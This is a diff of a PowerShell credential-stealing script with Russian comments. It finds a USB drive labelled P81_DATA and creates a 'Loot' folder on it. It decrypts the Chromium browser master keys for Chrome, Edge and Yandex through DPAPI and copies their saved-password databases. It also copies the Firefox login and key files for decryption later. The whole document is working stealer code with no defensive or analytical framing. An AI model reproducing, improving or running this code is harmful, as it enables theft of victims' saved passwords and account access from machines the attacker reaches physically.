@@ -1,51 +1,77 @@
-# 1. Поиск флешки P81_DATA
-$disk = (Get-WmiObject Win32_Volume | Where-Object {$_.Label -eq 'P81_DATA'}).DriveLetter
-if (!$disk) { exit }
+# 1. Поиск флешки по метке
+$u = (Get-Volume -FileSystemLabel "P81_DATA").DriveLetter
+if (!$u) { exit }
+$u = "$($u):"
 
-# 2. Папка назначения
-$dest = "$($disk)\Loot_$(Get-Date -f HHmm)"
+# 2. Создание папки назначения
+$dest = "$u\Loot_$(Get-Date -f HHmm)"
 cmd /c "mkdir $dest 2>nul"
-$report = "$dest\DECRYPTED_KEYS.txt"
+$logPath = "$dest\REPORT.txt"
 
-# 3. Chromium (Chrome, Edge, Yandex) - Дешифровка ключей на месте
+# Подгружаем сборку для работы с DPAPI
 Add-Type -AssemblyName System.Security
+
+# Функция для дешифровки ключа Chromium
+function Get-Key($statePath, $label, $destDir) {
+    if (Test-Path $statePath) {
+        try {
+            $json = Get-Content $statePath -Raw | ConvertFrom-Json
+            $rawKey = [Convert]::FromBase64String($json.os_crypt.encrypted_key)
+            $encKey = $rawKey[5..($rawKey.Length-1)]
+            
+            # Дешифровка мастер-ключа
+            $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
+            $base64Key = [Convert]::ToBase64String($masterKey)
+            
+            "[$label] Master Key: $base64Key" >> "$destDir\REPORT.txt"
+            return $true
+        } catch { 
+            "[$label] Key Error: $($_.Exception.Message)" >> "$destDir\REPORT.txt"
+            return $false 
+        }
+    }
+    return $false
+}
+
+# 3. СБОР CHROMIUM (Chrome, Edge, Yandex)
 $browsers = @(
-    @{n="CHROME"; p="$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"},
-    @{n="EDGE"; p="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"}
+    @{name="Chrome"; path="Google\Chrome\User Data"},
+    @{name="Edge"; path="Microsoft\Edge\User Data"},
+    @{name="Yandex"; path="Yandex\YandexBrowser\User Data"}
 )
 
 foreach ($b in $browsers) {
-    if (Test-Path $b.p) {
-        try {
-            $json = Get-Content $b.p -Raw | ConvertFrom-Json
-            $enc = [Convert]::FromBase64String($json.os_crypt.encrypted_key)
-            $dec = [System.Security.Cryptography.ProtectedData]::Unprotect($enc[5..($enc.Length-1)], $null, 0)
-            "[$($b.n)] MasterKey: $([Convert]::ToBase64String($dec))" | Out-File $report -Append
-        } catch {}
-    }
-}
-
-# 4. FIREFOX - Сбор файлов для дешифровки дома
-$ffPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
-if (Test-Path $ffPath) {
-    $ffDest = New-Item -Path $dest -Name "Firefox" -ItemType "Directory" -Force
-    Get-ChildItem -Path $ffPath -Directory | ForEach-Object {
-        $p = $_.FullName
-        $n = $_.Name
-        # Копируем ключи, пароли и куки
-        $files = @("key4.db", "logins.json", "cookies.sqlite", "cert9.db")
-        foreach ($f in $files) {
-            $srcFile = Join-Path $p $f
-            if (Test-Path $srcFile) {
-                # Сохраняем с префиксом профиля, чтобы не перемешались
-                cmd /c "copy /y `"$srcFile`" `"$ffDest\$($n)_$f`""
+    $userDataPath = Join-Path $env:LOCALAPPDATA $b.path
+    if (Test-Path $userDataPath) {
+        $foundFiles = Get-ChildItem -Path $userDataPath -Recurse -Filter "Login Data" -ErrorAction SilentlyContinue
+        foreach ($file in $foundFiles) {
+            $profileName = $file.Directory.Name
+            $localState = Join-Path $userDataPath "Local State"
+            $label = "$($b.name)_$($profileName)"
+            
+            if (Get-Key $localState $label $dest) {
+                # Копируем базу через xcopy (обходит блокировку занятых файлов)
+                cmd /c "xcopy /y /q `"$($file.FullName)`" `"$dest\$($label)_db`""
             }
         }
     }
 }
 
-# 5. Копирование баз Chromium (xcopy для обхода блокировок)
-cmd /c "xcopy /y /s /q `"$env:LOCALAPPDATA\Google\Chrome\User Data\*\Login Data`" `"$dest\Chrome\`" 2>nul"
-cmd /c "xcopy /y /s /q `"$env:LOCALAPPDATA\Microsoft\Edge\User Data\*\Login Data`" `"$dest\Edge\`" 2>nul"
+# 4. СБОР FIREFOX
+$ffPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
+if (Test-Path $ffPath) {
+    cmd /c "mkdir $dest\FF 2>nul"
+    Get-ChildItem -Path $ffPath -Directory | ForEach-Object {
+        $label = $_.Name
+        $files = @("logins.json", "key4.db", "cert9.db")
+        foreach ($f in $files) {
+            $src = Join-Path $_.FullName $f
+            if (Test-Path $src) {
+                cmd /c "copy /y `"$src`" `"$dest\FF\$($label)_$f`""
+            }
+        }
+        "[$label] Firefox profile files copied." >> $logPath
+    }
+}
 
 exit
